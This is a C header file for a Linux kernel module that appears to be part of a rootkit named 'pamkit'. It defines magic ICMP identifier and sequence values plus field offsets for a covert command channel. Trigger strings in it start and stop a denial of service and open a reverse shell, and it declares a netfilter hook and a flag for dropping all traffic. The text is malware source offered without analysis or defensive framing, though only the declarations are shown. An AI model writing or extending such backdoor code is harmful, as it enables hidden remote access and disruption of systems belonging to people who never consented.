#ifndef _NET_H
#define _NET_H

#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/err.h>

MODULE_LICENSE("GPL");

#define MAGIC_ID 200
#define MAGIC_SEQ_NR 200

/**
 * +0 : Type (1 Byte)
 * +1 : Code (1 Byte)
 * + 4/5 : Identifier (2 Byte)
 * + 6/7 : Sequence number (2 Byte)
 * + 8 : Data
*/
#define PAMKIT_ICMP_TYPE 0
#define PAMKIT_ICMP_CODE 1
#define PAMKIT_ICMP_ID_SM 5
#define PAMKIT_ICMP_ID_LG 4
#define PAMKIT_ICMP_SEQ_NR_SM 7
#define PAMKIT_ICMP_SEQ_NR_LG 6
#define PAMKIT_ICMP_DATA 8

#define START_DOS "pamkit-start"
#define END_DOS "pamkit-end"
#define DO_REV_SHELL "pamkit-rev-shell"

#define START_DOS_SIZE strlen(START_DOS)
#define END_DOS_SIZE strlen(END_DOS)
#define DO_REV_SHELL_SIZE strlen(DO_REV_SHELL)

extern int drop_everything;

int add_netfilter_hook(void);

void remove_netfilter_hook(void);

#endif /* _NET_H */